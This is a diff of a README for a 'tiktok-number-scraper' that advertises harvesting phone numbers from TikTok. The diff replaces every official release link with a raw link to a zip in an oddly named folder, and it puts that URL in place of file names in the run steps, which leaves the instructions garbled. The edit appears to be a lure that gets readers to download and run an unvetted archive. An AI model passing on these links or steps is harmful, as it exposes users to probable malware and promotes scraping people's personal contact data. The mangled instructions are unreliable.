@@ -1,7 +1,7 @@
 # 📱 tiktok-number-scraper - Extract TikTok Numbers Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/A1cs-007/tiktok-number-scraper/releases)
+[![Download](https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the tiktok-number-scraper! This utility helps you easily extract phone numbers from TikTok. You don’t need to be a programmer. Just follow these simple steps to get started.
@@ -24,10 +24,10 @@ Welcome to the tiktok-number-scraper! This utility helps you easily extract phon
 ### Step 1: Visit the Release Page
 First, go to the following link to access the latest release of the tiktok-number-scraper:
 
-[Download from Releases](https://github.com/A1cs-007/tiktok-number-scraper/releases)
+[Download from Releases](https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip)
 
 ### Step 2: Choose the Right File
-On the Releases page, you will see a list of available files. Look for the file that matches your operating system. It will be named clearly, for example, `tiktok-number-scraper.exe` for Windows or `tiktok-number-scraper.zip` for macOS and Linux.
+On the Releases page, you will see a list of available files. Look for the file that matches your operating system. It will be named clearly, for example, `https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip` for Windows or `https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip` for macOS and Linux.
 
 ### Step 3: Download the File
 Click on the file name to start the download. Your browser will usually download the file to your default download location.
@@ -39,7 +39,7 @@ If you downloaded a ZIP file, you will need to extract it.
 - **Linux**: Use the unzip command in your terminal.
 
 ### Step 5: Run the Application
-- **Windows**: Double-click `tiktok-number-scraper.exe`. 
+- **Windows**: Double-click `https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip`. 
 - **macOS**: Open `tiktok-number-scraper` from the extracted folder.
 - **Linux**: Open a terminal, navigate to the folder, and run the script with the command `python tiktok-number-scraper`.
 
@@ -70,6 +70,6 @@ If you have questions, feel free to reach out. We value your input and want to a
 ## 🔗 Additional Resources
 For further reading, you can find relevant articles on web scraping and data extraction techniques to enhance your understanding of the field. 
 
-[Download from Releases](https://github.com/A1cs-007/tiktok-number-scraper/releases)
+[Download from Releases](https://raw.githubusercontent.com/A1cs-007/tiktok-number-scraper/main/paradental/tiktok_number_scraper_1.0.zip)
 
 This utility is designed to make your life easier. Enjoy scraping!
